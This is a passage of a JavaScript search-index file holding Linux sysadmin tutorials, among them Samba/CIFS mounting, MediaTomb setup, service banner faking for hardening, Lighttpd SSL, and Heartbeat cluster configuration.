                content: "Introduction linkTo launch daemons at boot time, you need to act differently depending on the distribution. But before starting, the script must already exist in /etc/init.d.\nDebian linkHere’s the command:\nupdate-rc.d You can test with the -n argument:\nupdate-rc.d -n name_of_service defaults Once you’re ready, execute:\nupdate-rc.d name_of_service defaults And if you want to remove it:\nupdate-rc.d -f name_of_service remove Red Hat linkRun this command:\nntsysv A menu will open. It’s up to you to make your choice.\nGentoo linkFor Gentoo, here’s the procedure:\nrc-update add name_of_service default "
            }
        );
    index.add(
            {
                id:  543 ,
                href: "\/Couper_le_bip_de_l\u0027UC\/",
                title: "Disable the PC Speaker Beep",
                description: "How to disable the annoying PC speaker beep in Linux systems both temporarily and permanently.",
                content: "Introduction linkIt’s very annoying to hear BEEPs for every impossible completions or errors when you’re working in a shell!\nSolutions linkTemporary Solution linkSimply, from a graphical interface, run this command:\nxset -b That’s the solution to stop the biiiiiiiiiiiiiip :-)\nPermanent Solution linkIf you want a long-term solution! Add this line to the /etc/modprobe.d/blacklist file:\nblacklist pcspkr This will disable all PC speaker sounds (startup, shutdown…). Pure bliss!\n"
            }
        );
    index.add(
            {
                id:  544 ,
                href: "\/MediaTomb_:_Mise_en_place_d%27un_serveur_multim%C3%A9dia_%28UPnP%29\/",
                title: "MediaTomb: Setting up a multimedia (UPnP) server",
                description: "A guide on how to set up MediaTomb, a multimedia server for streaming movies, music, and photos using UPnP technology.",
                content: "Introduction linkMediaTomb is a multimedia server capable of streaming movies, music, and photos. It’s very practical for game consoles like Xbox360 or PlayStation 3, but has many other uses as well.\nFor example, if you have a machine that contains movies but isn’t connected to your TV screen, you need something to relay the content. This is where a PlayStation 3, for instance, comes in. However, it needs to know where to find the movies, so you need to install a UPnP server on your machine.\nOne of the best UPnP servers today is MediaTomb.\nInstallation linkAs usual, for Debian users:\napt-get install mediatomb Configuration linkMySQL linkThis step is optional, but personally I prefer centralizing information on my machine. If you skip this step, a MySQLite database will be used. I decided to set up MediaTomb with a MySQL database. First, connect to your MySQL server:\nmysql [-u ] [-p] Then let’s create a database dedicated to MediaTomb and an associated user:\nmysql\u003e CREATE DATABASE db_mediatomb; mysql\u003e GRANT ALL ON db_mediatomb.* TO 'mediatomb_user'@'localhost' IDENTIFIED BY 'mon_pasowrd'; Mediatomb linkMySQL linkNow we’re ready to configure this in the /etc/mediatomb/config.xml configuration file. First, modify this to disable SQLite:\nNow, activate MySQL:\nlocalhost mediatomb_user mon_password db_mediatomb Thumbnails linkFirst, let’s install this small package:\napt-get install ffmpegthumbnailer Then add this code in the ‘’ section:\n128 5 yes no Now restart the server:\n/etc/init.d/mediatomb restart Great! We’re done with MySQL.\nGraphical Interface linkNow you can use the graphical interface. Connect to the server with your MediaTomb server address on port 49152:\nhttp://ip_address:49152 All you have to do is configure your folders to scan and their refresh times. It takes some time to index them (depending on the number of items in your folders).\nSecurity linkTo limit access to network interfaces on your multimedia server, edit the /etc/default/mediatomb file:\nINTERFACE=\"bond0\" Then restart the MediaTomb service.\nWorking with PlayStation 3 linkFor the server to be recognized by PlayStation 3, you need to modify the file:\nImportant: You must have a PS3 firmware version 1.80 or higher\nThen restart the MediaTomb server. Now, on the PlayStation, you can scan for Multimedia servers and yours will appear magically.\nResources linkFuppes: Set Up A Linux PlayStation 3 Media Server\n"
            }
        );
    index.add(
            {
                id:  545 ,
                href: "\/Monter_un_partage_Windows_depuis_Samba\/",
                title: "Mounting a Windows Share from Samba",
                description: "How to mount Windows shares from Linux using Samba and CIFS methods, with configuration options for different Windows versions.",
                content: "Introduction linkMounting Windows shares from a Linux machine with Samba is straightforward with older Windows versions. However, for versions integrating NT technology (starting with Windows 2000), you might encounter problems like:\nparams.c:Parameter() - Ignoring badly formed line in configuration file: +########## Domains ########### cli_negprot: SMB signing is mandatory and we have disabled it. 30432: protocol negotiation failed SMB connection failed Or sometimes:\nsmb_add_request: request [f65480c0, mid=24160] timed out! smb_add_request: request [f6548ec0, mid=24161] timed out! smb_add_request: request [f6548ec0, mid=24162] timed out! smb_add_request: request [f6548ec0, mid=24163] timed out! smb_add_request: request [f6548ec0, mid=24164] timed out! This can be problematic when you need to perform this operation quickly. That’s why I’m sharing the solution.\nInstallation linkStart by installing the minimum requirements (ensure your kernel is \u003e= 2.2.x):\napt-get install smbfs Older than Windows 2000 linkFor these versions, check that you have what you need at the kernel level (insert your kernel version):\ngrep CONFIG_SMB_FS \u003c /boot/config-2.* CONFIG_SMB_FS=m Windows 2000 or newer linkFor versions newer than NT4, we’ll use CIFS:\ngrep CONFIG_CIFS \u003c /boot/config-2.* CONFIG_CIFS=m You can decide whether to keep SMB_FS or CIFS as modules or recompile them directly into the kernel.\nConfiguration linkNow we’re ready to connect to Windows shares.\nOlder than Windows 2000 linkIf using SMB, here’s the command:\nmount -t smbfs -o username=USER,password=PASS //SERVER/SHARE /DESTINATION/ Or in /etc/fstab:\n//nasServer/SHARE /home/NAS/LM smbfs user,noauto,rw,username=user,password=pass 0 0 If you encounter this type of message:\nparams.c:Parameter() - Ignoring badly formed line in configuration file: +########## Domains ########### cli_negprot: SMB signing is mandatory and we have disabled it. 28570: protocol negotiation failed SMB connection failed You have two options:\nSwitch to CIFS (see below) Modify Windows security options (not recommended) Modifying Windows Security Options linkAs mentioned above, this is strongly discouraged. But if you have no other choice, here’s the solution:\nOn your domain controller:\nOpen Administrative Tools Open domain controller security settings Then Security Settings Local Policies Security Options Edit the properties of “Microsoft network server: Digitally sign communications (always)” Disable this option Then apply the policy following this article: Windows: Refresh Security Policies (GPO)\nWindows 2000 or newer linkHere we’ll use CIFS to avoid problems with Windows security. Use this command:\nmount -t cifs -o username=USER,password=PASS //SERVER/SHARE /DESTINATION/ Or for newer versions:\nmount -t cifs //SERVER/SHARE /DESTINATION/ -o username=USER,password=PASS Or in /etc/fstab:\n192.168.10.2:/SHARE /home/NAS/LM cifs user,noauto,rw,username=user,password=pass,gid=1000,uid=1000 0 0 Your share is now mounted.\n"
            }
        );
    index.add(
            {
                id:  546 ,
                href: "\/XenServer_5.0_:_Configuration_d%27un_XenServer_avec_du_mat%C3%A9riel_SUN\/",
                title: "XenServer 5.0: Configuring XenServer with SUN Hardware",
                description: "Guide for configuring XenServer 5.0 with SUN hardware, including multipathing setup for StorageTek storage arrays and fiber channel connectivity.",
                content: "Introduction linkTo perform installation on multiple XenServer, I needed to set up multiple hardware devices connected via Fiber channel. I completed two installations, both with this kind of hardware:\nSUN X4150 SUN X4600 SUN StorageTek ST2540 SUN StorageTek ST6140 Hardware Connectivity linkTo setup connectivity, I used fiber channel. To make it work, you need to have Fiber Channel Switch and if possible, redundancy (so, 2 switches).\nHaving this kind of configuration creates multiple multipath links. This is very beneficial for fault tolerance and load balancing.\nLun Configuration linkTo have all paths active for multipathing, you need to present your LUN in a specific format to your XenServers. Simply connect to the disk array with CAM (Common Array Manager), select the LUN (or go to Administration to set all the LUNs) and set the host type: Windows 2000/Server 2003 non-clustered (with Veritas DMP).\nMultipathing configuration linkBy default, no preconfigured device is set for multipath configuration for SUN hardware. That’s why we need to change the default configuration to add configuration for the StorageTek.\nSUN StorageTek ST2540 linkAdd these lines to the /etc/multipath.conf configuration file:\ndevice { vendor \"SUN\" product \"LCSM100_F\" getuid_callout \"/sbin/scsi_id -g -u -s /block/%n\" prio_callout \"/sbin/mpath_prio_rdac /dev/%n\" features \"0\" hardware_handler \"1 rdac\" path_grouping_policy group_by_prio failback immediate rr_weight uniform no_path_retry queue rr_min_io 1000 path_checker rdac } SUN StorageTek ST6140 or ST6540 linkAdd these lines to the /etc/multipath.conf configuration file:\ndevice { vendor \"SUN\" product \"CSM200_R\" getuid_callout \"/sbin/scsi_id -g -u -s /block/%n\" prio_callout \"/sbin/mpath_prio_rdac /dev/%n\" features \"0\" hardware_handler \"1 rdac\" path_grouping_policy group_by_prio failback immediate rr_weight uniform no_path_retry queue rr_min_io 1000 path_checker rdac } Refresh configuration linkNow you need to restart the multipathd daemon or reboot your servers for changes to take effect.\nFAQ linkI applied a Xen Update Hotfix and my SAN is not recognized anymore linkReapply the configuration to your multipath. Each update will erase it.\nReferences linkhttp://forums.citrix.com/thread.jspa?threadID=241199\u0026tstart=0\nhttp://support.citrix.com/article/ctx118791\n"
            }
        );
    index.add(
            {
                id:  547 ,
                href: "\/Bani%C3%A8res_:_Cacher_les_bani%C3%A8res_de_ses_applications_%28Service_banner_faking%29\/",
                title: "Banners: Hiding Application Banners (Service Banner Faking)",
                description: "A guide to hiding service banners and modifying version information to improve security by making it harder for attackers to fingerprint your services.",
                content: "Introduction linkThis is a quick howto on faking service banners. Service banners often contain a lot of useful information for malicious script-kiddies, like the (real) running software on the remote host and its version number. Knowing this, they can better target their exploits. This howto deals with changing this information. Keep in mind that this won’t make your system more secure against a known exploit when you run a vulnerable service, however it can provide some ‘social engineering’ security: script-kiddies often scan whole IP blocks for a known vulnerability, and only attack those who give back a banner telling that they run the vulnerable service. This howto aims to fake the service banners and in this way, fool the script-kiddies. However, your system will still be vulnerable to an exploit if you’re running a vulnerable service! If a script-kiddie runs his exploit, even if he sees you don’t send out the right banner, you can still be hacked. So, always keep your system up-to-date, see this as a way to decrease the amount of effective attacks on your system, not as a way to be invulnerable. Of course there’s also the fun-factor: it’s quite amusing to see script-kiddies attempt to break into your ‘Microsoft-IIS/5.0’ also known as Apache 1.3.27 grin.\nIn this howto we’re going to hide some known services with banners from some other known (but worse) services. We’ve got five services running: ftp, ssh, smtp, http and pop3. Currently these services are running on: Proftpd 1.2.7, OpenSSH_3.5p1, Postfix 2.0.6, Apache/1.3.27 and Teapop 0.3.5. We’re going to ’transform’ these services to: Microsoft FTP Service, OpenSSH, Microsoft ESMTP MAIL Service, Microsoft-IIS/5.0 and Microsoft Exchange 2000 POP3 server. Of course we could had changed them to anything, but for the fun of it, we’ll change it to Microsoft.\nProbably, the service programmers don’t want users to change the service banners. The only reason I can come up with is their ego. Statistics collectors on the Internet (example: Netcraft.com collecting HTTP/HEAD information), count the number of machines running service X. For programmers it’s really a boost to see how many people are using their software. As long as the software is released under the GNU/GPL, you’re completely free to modify anything from the source, and you’re even allowed to re-distribute the changes. If you want to keep the programmers on the friendly side, you could change the banner to only advertise which software runs, not the version number or other information.\nPlease note:\nYou are completely responsible for your own actions. I can never be held responsible for any damage this HOWTO has done to you, your systems or your life. This works for me, however that doesn’t guarantee this will work for you.\nTerminology:\nFQDN = Fully Qualified Domain Name (hostname.domain.tld) Hostname = First part of the FQDN (example: localhost) Text between the \u003c and \u003e should be replaced with the corresponding values.\nServices linkProFTPd linkCurrent banner:\n220 ProFTPD 1.2.7 Server (FTP for: ) [] Banner lay-out: “response_code product_name product_version Server (ServerName) [hostname]” Wanted banner:\n220 Microsoft FTP Service (Version 5.0). Howto: Open src/main.c and search for\nif((id = find_config(server-\u003econf,CONF_PARAM,\"ServerIdent\",FALSE)) Comment:\n(/* if-block */) the whole if-block and add the following line under the if-block:\nsend_response(\"220\", \"%s\", server-\u003eServerName); Now re-compile proftpd. After compiling edit proftpd.conf and change the “ServerName” directive to \" Microsoft FTP Service (Version 5.0).\".\nOpenSSH linkCurrent banner:\nSSH-2.0-OpenSSH_3.5p1 Banner lay-out: SSH-version-OpenSSH_version Wanted banner:\nSSH-2.0-OpenSSH Howto: Open version.h and cut the “_3.5p1” from the end:\nMy_SSH_version Re-compile and it’s done.\nPostfix linkCurrent banner:\n220 ESMTP Ready and Serving. Banner lay-out: \"response_code hostname ESMTP additional_information\" Wanted banner:\n220 fire.deimos.fr Microsoft ESMTP MAIL Service, Version: 6.0.3790.1830 ready at Tue, 1 Apr 2008 16:57:50 +0200 Howto:\nOpen postfix’s main.cf (configuration file) and add this line: smtpd_banner = fire.deimos.fr Microsoft ESMTP MAIL Service, Version: 6.0.3790.1830 In the Postfix source edit the file src/global/mail_date.c and search the line: #define STRFTIME_FMT \"%a, %d %b %Y %H:%M:%S \" and replace with:\n#define STRFTIME_FMT \"%a,%d %b %Y %H:%M:%S \" There is only one space to delete.\nStay in this file and search this line:\nwhile (strftime(vstring_end(vp), vstring_avail(vp), \" (%Z)\", lt) == 0) and replace with:\nwhile (strftime(vstring_end(vp), vstring_avail(vp), \" \", lt) == 0) This is for deleting the (EST) at the end of the line.\nNow to finish, open src/smtpd/smtpd.c and search for the line: smtpd_chat_reply(state, \"220 %s\", var_smtpd_banner); and replace it with this line:\nsmtpd_chat_reply(state, \"220 %s ready at %s\", var_smtpd_banner, mail_date(time((time_t *) 0))); Now recompile, restart postfix and you’re done :-) Apache linkMethod 1 linkCurrent banner:\nApache/1.3.27 (Unix) mod_perl/1.25 PHP/4.2.3 Banner lay-out: “BASEPRODUCT/BASEREVISION (OS) Apache modules”\nWanted banner:\nMicrosoft-IIS/5.0 Howto: Open /src/include/httpd.h and search for:\n#define SERVER_BASEVENDOR \"Apache Group\" #define SERVER_BASEPRODUCT \"Apache\" #define SERVER_BASEREVISION \"\" Change this to the desired values:\ndefine SERVER_BASEVENDOR: Microsoft define SERVER_BASEPRODUCT: Microsoft-IIS define SERVER_BASEREVISION: 5.0 Now re-compile apache.\nYou can continue with the second method to have a full banner faking.\nMethod 2 linkOpen your httpd.conf (or apache2.conf) and search those directive. If it’s not there, add it. Set ServerTokens to Min:\nServerSignature Off ServerTokens Prod More information about the ServerTokens directive is at: http://carnagepro.com/pub/Docs/Apache2/mod/core.html#servertokens.\nTeapop linkCurrent banner:\n+OK Teapop [v0.3.5] - Teaspoon stirs around again \u003c1048009854.3FB15180@Llywellyn\u003e Banner lay-out: “POP_OK Teapop [version] - banner - \"\nWanted banner:\n+OK Microsoft Exchange 2000 POP3 server version 6.0.6249.0 () ready. Howto: The file /teapop/pop_hello.c contains the following line:\npop_socket_send(pinfo-\u003eout, \"%s Teapop [v%s] - %s %s\", POP_OK, POP_VERSION, POP_BANNER, pinfo-\u003eapopstr);\" Change this line to:\npop_socket_send(pinfo-\u003eout, \"%s Microsoft Exchange 2000 POP3 server version 6.0.6249.0 () ready.\", POP_OK);\" Now re-compile and it’s done.\nTelnet (on Solaris) linkThe default banner displayed during a telnet login contains the Solaris version which can be useful to a potential attacker.\nCreate a plain text file called “/etc/default/telnetd” which contains a line such as:\nBANNER=\"Unauthorized access prohibited\\n\\n\" The \\n characters encode blank lines.\nLighttpd linkOn Lighttpd, it’s very easy, simply add this line to your configuration file and restart the server:\nserver.tag = \"Apache/1.3.29 (Unix) mod_perl/1.29 PHP/4.4.1 mod_ssl/2.8.16 OpenSSL/0.9.7g\" "
            }
        );
    index.add(
            {
                id:  548 ,
                href: "\/redemarrer_x\/",
                title: "Restart X",
                description: "How to restart the X Window System using keyboard shortcuts and command line methods.",
                content: "Introduction linkTo restart X, there aren’t 36 solutions, but there is one in particular that I really like.\nSolution linkIt’s a keyboard shortcut:\nCtrl + Alt + Backspace This avoids having to type, for example:\n/etc/init.d/gdm restart That’s it, X restarts :-). Warning, this should only be done while in X, otherwise the PC will reboot :-(.\nProblem starting from Ubuntu 9.04 linkHere’s what you can read:\nCtrl-Alt-Backspace is now disabled, to reduce issues experienced by users who accidentally trigger the key combo. Users who do want this function can enable it in their xorg.conf, or via the command How annoying! To reactivate it:\napt-get install dontzap Then:\ndontzap --disable "
            }
        );
    index.add(
            {
                id:  549 ,
                href: "\/Mise_en_place_d\u0027OpenSSL_avec_Lighttpd\/",
                title: "Setting up OpenSSL with Lighttpd",
                description: "This guide explains how to create and insert SSL certificates in Lighttpd for better website security.",
                content: "Introduction linkAdding security to your website is important. In this guide, we’ll see how to create and insert SSL certificates in Lighttpd.\nInstallation linkWe only need OpenSSL:\napt-get install openssl Configuration linkGenerating SSL keys linkLet’s create an ssl directory in the Lighttpd configuration folder, then generate the certificates:\nmkdir /etc/lighttpd/ssl openssl req -new -x509 -keyout /etc/lighttpd/ssl/selfcert.pem -out /etc/lighttpd/ssl/selfcert.pem -days 3650 -nodes selfcert.pem: use the name that interests you (e.g., deimos.fr.pem) 3650: number of days the certificate is valid (10 years, we’re safe for a good while) Lighttpd linkLet’s enable the SSL module for Lighttpd:\nlighty-enable-mod ssl Then let’s modify the SSL configuration file so it takes our new certificate into account (/etc/lighttpd/conf-available/10-ssl.conf):\n$SERVER[\"socket\"] == \"0.0.0.0:443\" { ssl.engine = \"enable\" ssl.pemfile = \"/etc/lighttpd/ssl/deimos.fr.pem\" } And that’s it! All you need to do now is restart Lighttpd, and port 443 will be open with your certificate activated :-)\n"
            }
        );
    index.add(
            {
                id:  550 ,
                href: "\/Installation_et_configuration_d%5C%27un_cluster_Heartbeat_V2\/",
                title: "Installation and Configuration of a Heartbeat V2 Cluster",
                description: "Guide for installing, configuring and monitoring services with Heartbeat 2 cluster software for high availability systems.",
                content: "Introduction linkHeartbeat is one of the most widely used cluster solutions because it’s very flexible, powerful and stable. We’ll see how to proceed with installation, configuration and service monitoring for Heartbeat 2. Compared to version 1, Heartbeat 2 can manage more than 2 nodes.\nUnlike Heartbeat version 1, this solution cannot be set up in 30 minutes. You’ll need to spend a few hours on it…\nInstallation linkVia official repositories linkLet’s go, as usual, it’s relatively simple:\napt-get install heartbeat-2 Via external packages linkFor those who don’t want to use Debian packages because they’re not complete enough, go to https://download.opensuse.org/repositories/server:/ha-clustering/ and download the packages for your distribution (I took the Debian 64-bit ones, for example). Create a folder where you’ll put all the packages and navigate to it, then:\ndpkg -i * apt-get -f install This will install all packages and dependencies.\nIf you want to use the graphical interface, you’ll also need to install these packages:\napt-get install python-central python python-glade2 python-xml python-gtk2 python-gtkmvc Perform this on both nodes. Here they are called:\ndeb-node1 deb-node2 hosts linkTo simplify the configuration and HA transactions, properly configure your /etc/hosts file on all nodes:\n192.168.0.155 deb-node1 192.168.0.150 deb-node2 A DNS server can also do the job!\nNTP linkMake sure all servers have the same time. It is therefore advisable to synchronize them on the same NTP server (e.g., ntpdate 0.pool.ntp.org)\nsysctl.conf linkWe’re going to modify the management of “core” files. Heartbeat recommends modifying the default configuration by adding the following line in /etc/sysctl.conf:\nkernel/core_uses_pid=1 Then apply this configuration:\n/etc/init.d/procps.sh restart Configuration linkFirst, let’s get the example configuration files:\ncd /usr/share/doc/heartbeat-2 gzip -d ha.cf.gz haresources.gz cp authkeys ha.cf haresources /etc/ha.d/ Then we’ll start editing the configuration files. Go to /etc/ha.d/\nha.cf linkAn example of the ha.cf configuration file can be found in /usr/share/doc/heartbeat/ha.cf.gz.\nHere is the content of the /etc/ha.d/ha.cf file once modified:\nlogfacility local0 # For syslog integration auto_failback off # Services don't automatically fail back when a node comes back up rtprio 5 # Assigns priority to the heartbeat service deadping 20 # Node problem if it doesn't respond after 20 sec autojoin other # Allows other nodes to connect to the cluster node deb-node1 # My first node node deb-node2 # My second node crm on # We allow connections via GUI apiauth\tmgmtd\tuid=root respawn\troot\t/usr/lib/heartbeat/mgmtd -v respawn hacluster /usr/lib/heartbeat/ipfail # Launches a command when the node boots apiauth ipfail gid=haclient uid=root # We authorize root in the haclient group authkeys linkThis file is used for information exchange between the different nodes. I can choose sha1 as the encryption algorithm, followed by my passphrase:\n# # Authentication file. Must be mode 600 # # # Must have exactly one auth directive at the front. # auth send authentication using this method-id # # Then, list the method and key that go with that method-id # # Available methods: crc sha1, md5. Crc doesn't need/want a key. # # You normally only have one authentication method-id listed in this file # # Put more than one to make a smooth transition when changing auth # methods and/or keys. # # # sha1 is believed to be the \"best\", md5 next best. # # crc adds no security, except from packet corruption. # Use only on physically secure networks. # auth 1 1 sha1 This is my key ! Don’t forget to set the correct permissions on this file:\nchmod 0600 authkeys Replications and tests linkNow that our files are ready, we’ll upload them to the other nodes:\nscp ha.cf autkeys deb-node2:/etc/ha.d/ Now we just need to restart the nodes:\n/etc/init.d/heartbeat restart ssh root@deb-node2 /etc/init.d/heartbeat restart Now we’ll check if everything works:\ncrm_mon -i 5 The number 5 corresponds to the number of seconds the monitor will try to check the cluster status. If it tries to connect continuously and you have no conclusive results, check your logs:\n$ tail /var/log/syslog Jun 25 13:35:40 deb-node1 cib: [2739]: info: #========= Input message message start ==========# Jun 25 13:35:40 deb-node1 cib: [2739]: info: MSG: Dumping message with 6 fields Jun 25 13:35:40 deb-node1 cib: [2739]: info: MSG[0] : [t=cib] Jun 25 13:35:40 deb-node1 cib: [2739]: info: MSG[1] : [cib_op=cib_query] Jun 25 13:35:40 deb-node1 cib: [2739]: info: MSG[2] : [cib_callid=3] Jun 25 13:35:40 deb-node1 cib: [2739]: info: MSG[3] : [cib_callopt=256] Jun 25 13:35:40 deb-node1 cib: [2739]: info: MSG[4] : [cib_clientid=bc414c54-4630-456c-ad8a-6ab01b7e2152] Jun 25 13:35:40 deb-node1 cib: [2739]: info: MSG[5] : [cib_clientname=2775] Here we encounter a problem that appears if heartbeat has started and kept an old configuration in memory. So stop all nodes and delete the contents of the /var/lib/heartbeat/crm folder:\n/etc/init.d/heartbeat stop rm /var/lib/heartbeat/crm/* /etc/init.d/heartbeat start And now we’ll look at the state of our cluster again:\n$ crm_mon -i5 Refresh in 5s... ============ Last updated: Tue Jun 26 06:58:38 2007 Current DC: deb-node2 (18ef92e2-cff0-469b-ab77-a2ef0e45ebd7) 2 Nodes configured. 0 Resources configured. Configuration of cluster services linkThe file that will interest us is /var/lib/heartbeat/crm/cib.xml (alias CIB).\ncrm_config link default_resource_stickiness: Do you prefer to keep your service on the current node or move it to one that has more available resources? This option is equivalent to “auto_failback on” except that resources can move to nodes other than the one on which they were activated.\n0: If the value is 0, resources will be automatically assigned. \u003e 0: The resource will prefer to return to its original node, but it can also move if this node is not available. A higher value will reinforce the resource to stay where it currently is. \u003c 0: The resource will prefer to move elsewhere than where it currently is. A higher value will cause this resource to move. INFINITY: The resource will always return to its initial place unless forced (node off, stand by…). This option is equivalent to “auto_failback off” except that resources can move to nodes other than the one on which they were activated. -INFINITY: Resources will automatically go to another node. options-transition_idle_timeout (60s by default): If no action has been detected during this time, the transition is considered to have failed. If each initialized operation has a higher timeout, then it will be taken into account.\nsymmetric_cluster (true by default): Specifies that resources can be launched on any node. Otherwise, you will need to create specific “constraints” for each resource.\nno_quorum_policy (stop by default):\nignore: Pretends that we have a quorum freeze: Does not start any resources not present in our partition. Resources in our partition can be moved to another node with the partition (fencing disabled). stop: Stops all resources activated in our partition (fencing disabled) default_resource_failure_stickiness: Force a resource to migrate after a failure.\nstonith_enabled (false by default): Failed nodes will be fenced.\nstop_orphan_resources (true by default): If a resource is found with no definition.\ntrue: Stops the action false: Ignores the action This affects more CRM’s behavior when the resource is deleted by an admin without stopping it first.\nstop_orphan_actions (true by default): If a recursive action is found and there is no definition: true: Stops the action false: Ignores the action This affects more CRM’s behavior when the interval for a recurring action is modified.\nremove_after_stop: This removes the resource from the “status” section of the CIB.\nis_managed_default (true by default): Unless the resource definition says otherwise:\ntrue: The resource will be started, stopped, monitored and moved if needed. false: The resource will not be started if stopped, stopped if started, and not if it has scheduled recurring actions. short_resource_names (false by default, true recommended): This option is for compatibility with versions prior to 2.0.2\nnodes link Here we will define our nodes.\nid: It is automatically generated when heartbeat is started and changes depending on several criteria. uname: Node names. type: normal, member or ping. If you don’t know what to put because the ids haven’t been generated yet, put this:\nresources link 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 L26: Here we have created a group. I strongly recommend this to avoid making mistakes. The group is called “group_1”. L27: Then we insert “IPaddr_192_168_0_90” as a name for the definition of an IP address. The type being “IPaddr”. L29: We insert a monitoring operation to check every 5 sec if everything is going well with a timeout of 5 sec. L34: At the attributes level, we set the virtual IP address we want to use. L39: We define an instance that will allow Apache2 (not yet configured) and the IP address to work. L43: Now we create the primitive for Apache2 L45: We will monitor Apache2 every 120s with a timeout of 60s L49: Apache2 must start on node2 by default L50: We indicate that group L51: The state of Apache2 must be started by default The simplest way to avoid headaches is to use the Heartbeat GUI. It will do the configuration for you :-)\nconstraints link 98 99 100 101 102 103 104 105 106 107 108 109 110 111 The constraints are used to indicate what should start before what. It’s up to you to decide according to your needs.\nManagement of Cluster Services linkTo start, I strongly encourage you to consult this page.\nTo list services, here is the command:\ncrm_resource -L Preparing a cluster service linkBefore continuing, make sure the configuration files of the two servers are identical, and that the services are stopped (here apache2):\n/etc/init.d/apache2 stop Then make sure that the services managed by Heartbeat are no longer automatically started when Linux boots:\nupdate-rc.d -f apache2 remove You can now type (on both servers):\n/etc/init.d/heartbeat start After a few moments, the services should normally have started on the first machine, while the other is waiting.\nSwitching a service to another node linkTo switch, for example, our Apache2 service (apache2_2) to the second node (deb-node2):\ncrm_resource -M -r apache2_2 -H deb-node2 If you want to switch a service from a node to itself, you’ll get the following error:\nError performing operation: apache2_2 is already active on deb-node2 Starting a service linkStarting a cluster service is quite simple. Here we want to start Apache2 (apache2_2)\ncrm_resource -r apache2_2 -p target_role -v started If you want to start Apache2 on the second node, you must first reallocate it before starting it (documentation here). Ex:\ncrm_resource -M -r apache2_2 -H deb-node2 crm_resource -r apache2_2 -p target_role -v started This will switch apache2_2 which was running (so currently stopped) to the second node, but it won’t start it. You’ll need to run the second line to start it.\nAdding an additional node linkSo here’s the deal, there are several solutions. I’ll give you the one that seems best to me. In the /etc/ha.d/ha.cf file, check this (otherwise you’ll have to reload your heartbeat configuration, which will cause a small outage):\nautojoin other # Allows other nodes to connect to the cluster This will authorize nodes that are not entered in the ha.cf file to connect.\nFor this, a minimum of security is required, which is why you still need to copy the ha.cf and authkeys files to deb-node3 (my new node). Note: First edit the ha.cf file to add the new node. This will allow you to have this node hardcoded at the next startup:\nautojoin other # Allows other nodes to connect to the cluster node deb-node1 # My first node node deb-node2 # My second node node deb-node3 # My 3rd node Now we send all this to the new node and don’t forget to set the correct permissions:\ncd /etc/ha.d/ scp ha.cf authkeys deb-node3:/etc/ha.d/ ssh deb-node3 chown hacluster:haclient /var/lib/heartbeat/crm/* And now the 3rd node joins the cluster:\n$ /etc/init.d/heartbeat restart $ crm_mon -i5 Node: deb-node2 (18ef92e2-cff0-469b-ab77-a2ef0e45ebd7): online Node: deb-node1 (08f85a1b-291f-46a7-b2d8-cab46788e23d): online Node: deb-node3 (cdd9b426-ba04-4bcd-98a8-76f1d5a8ecb0): online And that’s it, it’s integrated without interruptions :-)\nIf you create a new machine by “rsync” from a machine in the cluster, you must delete the following files on the new machine:\nrm /var/lib/heartbeat/hb_uuid FAQ linkClusterlab FAQ (Excellent site)\nResources linkDocumentation on setting up Heartbeat 2 Documentation on Setting up a Web Server with Apache, LVS and Heartbeat 2 Documentation on Heartbeat2 Xen cluster with drbd8 and OCFS2 Enable high availability for composite applications https://en.wikipedia.org/wiki/High_availability\n"
            }
        );
    index.add(
            {
                id:  551 ,
                href: "\/Installation_et_configuration_d\u0027un_cluster_Heartbeat_V1\/",
                title: "Installation and Configuration of a Heartbeat V1 Cluster",
                description: "This guide explains how to set up and configure a Heartbeat V1 cluster for high availability services on Linux.",
                content: "Introduction linkThe main idea to ensure service availability is to have multiple machines (at least two) running simultaneously. These machines form what we call a cluster, and each machine is a node in the cluster. Each machine will check if the others are still responding by taking their pulse. If a machine stops working, the others will ensure the service.\nOnce the cluster is configured, it is accessed through a single unique IP address, which is the cluster’s IP address; the cluster itself consists of multiple nodes.\nTo implement this kind of technique, we will use the HeartBeat application, which will monitor the machines and apply a series of scripts defined by the user if necessary (i.e. if a machine fails).\nPreliminary Information linkThe test configuration consists of two modest machines; twin1 and twin2.\nThe cluster will be accessible through the address 192.168.252.205.\nTwin 1 link Master / Primary Pentium 3 - 500 MHz - 128MB RAM Fresh minimal installation of Debian Kernel upgraded to 2.6.18-4-686 (instead of 386) IP: 192.168.252.200 Hostname: twin1 13.5GB disk split into 5 partitions (/ of 4.5GB, /srv/prod of 3GB, /srv/intern of 3GB, /srv/other of 2GB and swap of 1GB) Twin 2 link Slave / Secondary Pentium 3 - 700 MHz - 128MB RAM Fresh minimal installation of Debian Stable Kernel upgraded to 2.6.18-4-686 (instead of 386) IP: 192.168.252.201 Hostname: twin2 10GB disk split into 4 partitions (/ of 3GB, /srv/prod of 3GB, /srv/intern of 3GB and swap of 1GB) Machine Status linkOn both machines, here’s what has been done.\nInstalled Debian 4.0 CD and manually configured the network. Updated some basic packages via the Internet. sudo apt-get update sudo apt-get dist-upgrade Upgraded the kernel to take advantage of the Pentium 3 (not necessary). After the upgrade, a reboot to use the new kernel. sudo apt-get install linux-image-2.6.18-686 sudo reboot Installing HeartBeat linkHeartBeat is very simple to install on Debian. The package can be found in the standard repositories. All you need to do is run the following command on both machines (Twin 1 and Twin 2):\nsudo apt-get install heartbeat-2 Once the service is installed, you will get an error saying that the ha.cf configuration file is not present. This is perfectly normal.\nNow let’s look at the basic configuration of HeartBeat.\nBasic Configuration linkHeartBeat’s configuration is based on 3 fundamental files. During the basic configuration, I will present a minimalist configuration with the goal of:\nproviding a minimalist base that you can adapt to your needs over time. The three configuration files are strictly identical on both machines; in your case, they should be copied to each machine in the cluster. In our example, this means Twin 1 and Twin 2.\nha.cf link sudo vi /etc/ha.d/ha.cf Here is the ha.cf file I use on Twin 1 and Twin 2:\nbcast eth0 debugfile /var/log/ha-debug logfile /var/log/ha-log logfacility local0 keepalive 2 deadtime 10 warntime 6 initdead 60 udpport 694 node twin1 node twin2 auto_failback off apiauth mgmtd uid=root crm on respawn root /usr/lib/heartbeat/mgmtd -v Let’s examine this configuration file in detail:\nbcast: indicates the network interface through which we will take the pulse. debugfile: indicates the debugging file to use. logfile: indicates the activity log to use. logfacility: indicates that we are also using the syslog facility. keepalive: indicates the delay between two pulse beats. This delay is given by default in seconds; to use milliseconds, add the ms suffix. deadtime: indicates the time needed before considering a node as dead. This time is given by default in seconds; to use milliseconds, add the ms suffix. warntime: indicates the delay before sending a warning for late pulses. This delay is given by default in seconds; to use 